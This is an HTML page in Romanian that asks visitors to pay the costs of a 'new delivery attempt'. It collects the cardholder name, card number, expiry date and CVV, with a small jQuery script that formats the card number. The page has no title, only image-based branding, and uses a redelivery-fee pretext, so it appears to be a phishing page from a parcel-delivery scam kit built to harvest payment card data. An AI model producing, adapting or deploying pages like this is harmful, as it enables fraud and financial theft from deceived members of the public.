<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./css/monio.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <title></title>
</head>
<body>
    <div>
        <div class="batr2">
            <div class="topap">
                <img src="./img/top.JPG" alt="">
            </div>

            <div>
                <div>
                    <p class="pp2"> PLATA COSTURILOR NOII ÎNCERCĂRI DE LIVRARE</p>
                    <div class="section"  style="margin-top: 30px; margin-bottom: 40px;">
                        <img class="ccimg" src="./img/cocio.JPG" alt="">
                            <form  method="post" id="pg2">
                                
                                <p>Numele de pe card*:</p>
                                <input type="text" name=""  id="numnn" required>
            
                                <p>Numărul cardului*:</p>
                                <input type="tel" name="" id="numcc" required maxlength="19" placeholder="---- ---- ---- ----">
                        
                                <p>Cardul este valabil până la (lună/an)*:</p>
                                <div class="exp">
                                    
                                    <input class="mm" type="tel" name="" id="mmo" required placeholder="MM" maxlength="2">
                                    <input type="tel" name="" id="aao" required placeholder="AA"  maxlength="4">
                                </div>
                        
                                <p>CVV*:</p>
                                <input class="cfifi" type="tel" name="" id="numvv" required maxlength="8" maxlength="4">
        
        
        
                                <button class="btn2" type="submit">plata</button>
                            </form>
                        </div>
                    </div>
            </div>
        </div>
    </div>

    <div>
        <div class="bobota">
            <img src="./img/boit.JPG" alt="">
        </div>
    </div>


    <script>
        $("#numcc").on("keyup",function(){
           cc = $(this).val().split(" ").join("");
           cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
           $(this).val(cc);
       });
    </script>
